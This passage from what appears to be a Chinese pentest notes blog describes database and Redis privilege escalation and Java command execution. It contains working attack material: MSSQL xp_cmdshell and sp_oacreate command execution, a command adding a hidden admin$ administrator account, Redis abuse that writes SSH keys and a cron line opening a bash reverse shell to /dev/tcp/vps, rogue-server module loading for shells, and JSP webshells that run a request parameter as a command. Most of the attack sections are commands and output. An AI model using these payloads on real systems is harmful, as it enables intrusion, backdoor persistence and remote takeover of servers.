class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看secure_file_priv的值</span><br>SHOW VARIABLES LIKE <span class="hljs-string">&quot;secure_file_priv&quot;</span>;<br><br><span class="hljs-comment">#这个值可以在my.ini设置为空</span><br>secure_file_priv =<br></code></pre></td></tr></table></figure><p><strong>MSF 下有Mof 提权模块</strong></p><p>执行成功后会直接反弹一个 <code>system</code>权限的meterpreter </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/mysql/mysql_mof<br></code></pre></td></tr></table></figure><h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><p><strong>首先查看权限</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--是否sa权限，返回 1 就是sa</span><br><span class="hljs-keyword">select</span> IS_SRVROLEMEMBER(<span class="hljs-string">&#x27;sysadmin&#x27;</span>)<br><br><span class="hljs-comment">--是否dba权限，返回 1 就是DBA</span><br><span class="hljs-keyword">select</span> IS_MEMBER(<span class="hljs-string">&#x27;db_owner&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><blockquote><p><strong>适用(xp\2000\2003系统)</strong></p><p>前提是MSSQL是以system用户运行的，才能提权；</p><p>如果用nt authority\network service运行，是没有系统权限的。</p></blockquote><p>默认情况下是关闭的，用下边的命令开启</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>; <span class="hljs-comment">--允许修改高级参数</span><br>RECONFIGURE;<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>; <span class="hljs-comment">--打开xp_cmdshell扩展</span><br>RECONFIGURE;<br></code></pre></td></tr></table></figure><p>如果xp_cmdshell被删除，可以尝试上传<code>xplog70.dll</code> <a href="https://fix4dll.com/xplog70_dll">https://fix4dll.com/xplog70_dll</a> 进行恢复，恢复语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Exec</span> master.dbo.sp_addextendedproc <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>,<span class="hljs-string">&#x27;c:\\xplog70.dll&#x27;</span>;<br></code></pre></td></tr></table></figure><p>然后执行命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> xp_cmdshell <span class="hljs-string">&#x27;whoami&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="sa提权登RDP"><a href="#sa提权登RDP" class="headerlink" title="sa提权登RDP"></a>sa提权登RDP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> xp_cmdshell <span class="hljs-string">&#x27;net use \\192.168.10.133\ipc$ mcc5@133 /user:192.168.10.133\administrator&amp;&amp; copy \\192.168.10.133\c$\users\public\videos\sweetpotato.exe c:\users\public\videos\s.exe&#x27;</span><br><br><span class="hljs-built_in">exec</span> xp_cmdshell <span class="hljs-string">&#x27;c:\users\public\videos\s.exe -a &quot;whoami&quot;&#x27;</span><br><br><span class="hljs-built_in">exec</span> xp_cmdshell <span class="hljs-string">&#x27;c:\users\public\videos\s.exe -a &quot;net user admin$ @admin.886 /add&amp;net localgroup administrators admin$ /add&quot;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="SP-OACreate"><a href="#SP-OACreate" class="headerlink" title="SP_OACreate"></a>SP_OACreate</h3><blockquote><p><strong>适用(xp\2000\2003系统)</strong></p></blockquote><p>当xp_cmdshell 删除以后，还可以使用SP_OACreate</p><p>打开组件：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--开启EXEC</span><br>sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;<br>RECONFIGURE;<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="hljs-number">1</span>;<br>RECONFIGURE;<br><br><span class="hljs-comment">--关闭EXEC</span><br>sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">0</span>;<br>RECONFIGURE;<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="hljs-number">0</span>;<br>RECONFIGURE;<br></code></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output <span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#x27;</span><br></code></pre></td></tr></table></figure><p>这种方式是无回显的，打开1.txt查看命令执行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">type</span> c:\\1.txt<br></code></pre></td></tr></table></figure><h3 id="openrowset沙盒"><a href="#openrowset沙盒" class="headerlink" title="openrowset沙盒"></a>openrowset沙盒</h3><blockquote><p><strong>(2003系统可用、2012-r2实验失败)</strong></p></blockquote><p>首先检查cmd_shell是否开启：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xp_cmdshell&#x27;</span><br><span class="hljs-comment">--结果为 1 就是开启</span><br></code></pre></td></tr></table></figure><p>开启默认关闭的xp_regwrite存储过程：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--开启</span><br><span class="hljs-keyword">EXEC</span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span> ,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span> ,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span> ,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span> ,<span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span><br>GO<br>RECONFIGURE<br>GO<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>, <span class="hljs-number">1</span><br>GO<br>RECONFIGURE<br>GO<br><br><span class="hljs-comment">--利用完后恢复</span><br><span class="hljs-keyword">EXEC</span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">1</span>;<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,<span class="hljs-number">0</span>;reconfigure;<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">0</span>;reconfigure;<br></code></pre></td></tr></table></figure><p>利用jet.oledb执行系统命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> openrowset(<span class="hljs-string">&#x27;microsoft.jet.oledb.4.0&#x27;</span> ,<span class="hljs-string">&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27;</span> ,<span class="hljs-string">&#x27;select shell(&quot;cmd.exe /c whoami &gt; c:\\666.txt&quot;)&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这个也是无回显的</p><p>沙盒模式SandBoxMode参数含义（默认是2）：</p><blockquote><p><code>0</code>：在任何所有者中禁止启用安全模式</p><p><code>1</code> ：为仅在允许范围内</p><p><code>2</code> ：必须在access模式下</p><p><code>3</code>：完全开启</p></blockquote><p>openrowset是可以通过OLE DB访问SQL Server数据库</p><p>OLE DB是应用程序链接到SQL Server的的驱动程序</p><h2 id="Oracle提权"><a href="#Oracle提权" class="headerlink" title="Oracle提权"></a>Oracle提权</h2><p><a href="https://github.com/jas502n/oracleShell">工具</a></p><h2 id="postgresql"><a href="#postgresql" class="headerlink" title="postgresql"></a>postgresql</h2><p>CVE-2018-1058  CVE-2019-9193</p><h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><p>主要是指未授权访问：写ssh-keygen登录、写计划任务反弹shell、写webshell、主从复制</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>提权是一项很考验综合能力的渗透环节，需要长时间的积累与练习，这笔记有点潦草和凌乱，知识点复杂繁多，将不断更新</p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis未授权访问</title>
    <link href="/2022/03/24/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <url>/2022/03/24/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/twosmi1e/p/13308682.html">https://www.cnblogs.com/twosmi1e/p/13308682.html</a></p><h2 id="写ssh-keygen登录"><a href="#写ssh-keygen登录" class="headerlink" title="写ssh-keygen登录"></a>写ssh-keygen登录</h2><p>先决条件：目标root账号启动redis服务，开放ssh服务，允许<a href="https://www.runoob.com/w3cnote/set-ssh-login-key.html">密钥</a>登录</p><ol><li>生成公私钥</li></ol><blockquote><p>ssh-keygen -t rsa</p></blockquote><ol start="2"><li>处理公钥</li></ol><blockquote><p>(echo -e “\n\n”;cat id_rsa.pub; echo -e “\n\n”) &gt; 1.txt</p></blockquote><ol start="3"><li>写入公钥到redis服务器</li></ol><blockquote><p>cat 1.txt | redis-cli -h 192.168.254.130 -x set pub</p></blockquote><ol start="4"><li>登录</li></ol><blockquote><p>redis-cli -h 192.168.254.130</p></blockquote><ol start="5"><li>查看redis备份路径</li></ol><blockquote><p>config get dir</p></blockquote><ol start="6"><li>篡改路径为ssh公钥存放(/root/.ssh/)</li></ol><blockquote><p>config set dir /root/.ssh/</p></blockquote><ol start="7"><li>设置上传公钥备份文件名字为authorized_keys：</li></ol><blockquote><p>config set dbfilename authorized_keys</p></blockquote><ol start="8"><li>保存退出</li></ol><blockquote><p>save</p><p>exit</p></blockquote><p>ssh免密登录redis服务器：</p><blockquote><p>ssh -i id_rsa <a href="mailto:&#x72;&#x6f;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#x32;&#53;&#x34;&#46;&#x31;&#x33;&#48;">&#x72;&#x6f;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#x32;&#53;&#x34;&#46;&#x31;&#x33;&#48;</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs shell">──(root💀c)-[~]<br>└─# ssh-keygen -t rsa                          <br>Generating public/private rsa key pair.<br>Enter file in which to save the key (/root/.ssh/id_rsa): <br>Enter passphrase (empty for no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved in /root/.ssh/id_rsa<br>Your public key has been saved in /root/.ssh/id_rsa.pub<br>The key fingerprint is:<br>SHA256:N0MqLY84OiIS0KYJ2zIQe7SMBSSmIJHszo3ueKWaR6A root@192.168.254.128<br>The key&#x27;s randomart image is:<br>+---[RSA 3072]----+<br>|O*               |<br>|O.o              |<br>|oO .      .      |<br>|B.*    . o       |<br>|BOo   o S +      |<br>|E+o... = . o     |<br>|.= oo . .        |<br>|=o=. .           |<br>|B*..             |<br>+----[SHA256]-----+<br>                                                                             <br>┌──(root💀192)-[~]<br>└─# cd .ssh/<br>                                                                             <br>┌──(root💀192)-[~/.ssh]<br>└─# ls<br>id_rsa  id_rsa.pub<br>                                                                             <br>┌──(root💀192)-[~/.ssh]<br>└─# (echo -e &quot;\n\n&quot;;cat id_rsa.pub; echo -e &quot;\n\n&quot;)&gt;1.txt<br>                                                                             <br>┌──(root💀192)-[~/.ssh]<br>└─# cat 1.txt | redis-cli -h 192.168.254.130 -x set file <br>OK<br>                                                                             <br>┌──(root💀192)-[~/.ssh]<br>└─# redis-cli -h 192.168.254.130<br>192.168.254.130:6379&gt; config get dir<br>1) &quot;dir&quot;<br>2) &quot;/root/redis-2.8.17/src&quot;<br>192.168.254.130:6379&gt; config set dir /root/.ssh/<br>OK<br>192.168.254.130:6379&gt; config get dbfilename<br>1) &quot;dbfilename&quot;<br>2) &quot;dump.rdb&quot;<br>192.168.254.130:6379&gt; config set dbfilename authorized_keys<br>OK<br>192.168.254.130:6379&gt; save<br>OK<br>192.168.254.130:6379&gt; exit<br>                                                                             <br>┌──(root💀192)-[~/.ssh]<br>└─# ssh -i id_rsa root@192.168.254.130 -p 22888<br>The authenticity of host &#x27;[192.168.254.130]:22888 ([192.168.254.130]:22888)&#x27; can&#x27;t be established.<br>ECDSA key fingerprint is SHA256:Zopc14FUvhzjh0dHrhIok+KREN4hXhbm2NNkyuMDXbw.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added &#x27;[192.168.254.130]:22888&#x27; (ECDSA) to the list of known hosts.<br>Last login: Thu Mar 24 09:21:28 2022 from 192.168.254.128<br>[root@centos7 ~]#                   <br></code></pre></td></tr></table></figure><h2 id="写计划任务反弹shell"><a href="#写计划任务反弹shell" class="headerlink" title="写计划任务反弹shell"></a>写计划任务反弹shell</h2><p>ubuntu下可以利用的cron有以下几个地方：</p><pre><code>/etc/crontab：该文件里面的任务计划可以直接执行/etc/cron.d/*：该目录下的任意文件都可以被当作任务计划去执行，并且避免了原先任务计划文件被覆盖的情况/var/spool/cron/crontabs/：该目录下定义的任务计划文件会被执行，不过需要有一个前提，就是该任务计划文件的权限必须为600</code></pre><p>CentOS下计划任务文件</p><pre><code>/etc/crontab：该文件里面的任务计划可以直接执行/var/spool/cron/root：该文件里面的任务计划可以直接执行</code></pre><p>和写ssh-keygen方法一样</p><blockquote><p>set x “\n* * * * * bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1\n”     //* * * * * 每一分钟执行一次</p><p>config set dir /var/spool/cron</p><p>config set dbfilename root</p><p>save</p></blockquote><p>Ubuntu下：</p><ol><li>如果写<code>/etc/crontab</code>和<code>/etc/cron.d</code>，由于存在乱码，语法不识别，会导致ubuntu不能正确识别，导致定时任务失败。</li><li>如果写<code>/var/spool/cron/crontabs/root</code>，权限是644，ubuntu不能运行。</li></ol><blockquote><p>crontab反弹debian,ubuntu都不行，因为他们对计划任务的格式很严格，必须要执行<code>crontab -u root /var/spool/cron/crontabs/root</code>通过语法检查后，才能执行计划任务。</p></blockquote><p>所以当渗透系统为ubuntu/debian且是低权限时，不优先考虑写计划任务</p><h2 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h2><p>略</p><p>redis-4.0.10 之前的版本 Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p><p>redis-4.0.10 之后的版本 默认开启了保护模式，仅允许本地无密码验证连接。如果要利用，可能就要考虑弱口令和配置错误了。</p><p>实战在生产环境下用还是会有很多问题的</p><ol><li>redis数据量稍微大一点，写shell到文件之后，php因为文件太大是会拒绝执行的</li><li>Ubuntu，Debian写计划任务反弹无用</li><li>写/etc/passwd会覆盖原有/etc/passwd，不可能改了再改回来</li><li>生产环境下用<code>KEY *</code> 这样的命令直接炸</li></ol><h2 id="主从复制getshell"><a href="#主从复制getshell" class="headerlink" title="主从复制getshell"></a>主从复制getshell</h2><p>脚本一：</p><p><a href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server</a></p><p>vps：</p><blockquote><p>python3 redis-rogue-server.py -v -lport 80 -path exp.so</p></blockquote><p>redis-cli连接redis服务</p><p>计划任务以及ssh_keygen不可写时，写/tmp</p><blockquote><p>config set dir /tmp</p><p>config set dbfilename exp.so</p></blockquote><p>设置主从关系</p><blockquote><p>slaveof vps 80</p></blockquote><p>导入模块</p><blockquote><p>module load exp.so</p><p>module list //出现如下即成功：</p><ol><li><ol><li>“name”</li><li>“system”</li><li>“ver”</li><li>(integer) 1</li></ol></li></ol></blockquote><p>反弹shell：</p><blockquote><p>nv -lnvp 2333</p><p>system.rev vps 2333</p></blockquote><p>脚本二：</p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>有两个模式</p><blockquote><p>python3 redis-rogue-server.py –rhost 123.58.236.76 –rport 6379 –lhost vps –lport 443 -v (默认：–exp=exp.so)</p></blockquote><p>i进入交互，r反弹shell</p><p>脚本三：</p><p><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p><blockquote><p>python3 redis-rce.py -r 172.20.0.1 -L 127.0.0.1 -P 80 -f module.so</p></blockquote><p>同上</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CE&amp;Reflection</title>
    <link href="/2022/03/24/CE&amp;Reflection/"/>
    <url>/2022/03/24/CE&amp;Reflection/</url>
    
    <content type="html"><![CDATA[<h1 id="命令执行-amp-反射"><a href="#命令执行-amp-反射" class="headerlink" title="命令执行&amp;反射"></a>命令执行&amp;反射</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Runtime.getRuntime().exec(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>无回显：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>回显：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        BufferedReader br = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Process p = Runtime.getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>);<br>            br = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(p.getInputStream()));<br>            String line = <span class="hljs-keyword">null</span>;<br>            StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder();<br>            <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>                sb.append(line + <span class="hljs-string">&quot;\n&quot;</span>);<br>            &#125;<br>            System.out.println(sb.toString());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (br != <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    br.close();<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>写成 jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%=Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>))%&gt;<br></code></pre></td></tr></table></figure><p>在 Tomcat 9 显示：</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324192141823.png"></p><p>在 Tomcat 8 显示：</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324192209758.png"></p><p>添加回显：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br><span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;<br><span class="hljs-keyword">byte</span>[] b =<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br><span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;<br>    out.println(<span class="hljs-keyword">new</span> String(b));<br>&#125;<br>out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>%&gt;<br></code></pre></td></tr></table></figure><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%=Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>))%&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%<br>    InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br>    ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>    <span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>    <span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>        baos.write(b, <span class="hljs-number">0</span>, a);<br>    &#125;<br>    out.write(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span> + <span class="hljs-keyword">new</span> String(baos.toByteArray()) + <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>%&gt;<br></code></pre></td></tr></table></figure><h3 id="Runtime-命令执行调用链"><a href="#Runtime-命令执行调用链" class="headerlink" title="Runtime 命令执行调用链"></a>Runtime 命令执行调用链</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220612221321403.png"></p><p><code>exec</code>并不是命令执行的最终点，<a href="https://mp.weixin.qq.com/s/rb3aq-Si0Q35gm_0yLQxCA">参考</a></p><p>首先进入<code>exec</code>方法发现，调用两次重载方法<code>exec</code>，第二次调用重载方法发现是分割命令参数，即划分为<code>String[] cmdarray</code>，<code>ProcessBuilder.start()</code>调用<code>ProcessImpl.start()</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220612222530565.png"></p><p>在<code>ProcessBuilder.start()</code>经过安全检查(如果配置有安全策略，可见这里可能产生阻断)，那么从调用链的顺序来说，直接调用<code>ProcessImpl.start()</code>是否可以绕过安全策略</p><p>在<code>ProcessImpl.start()</code>内，创建<code>ProcessImpl</code>对象</p><p><img 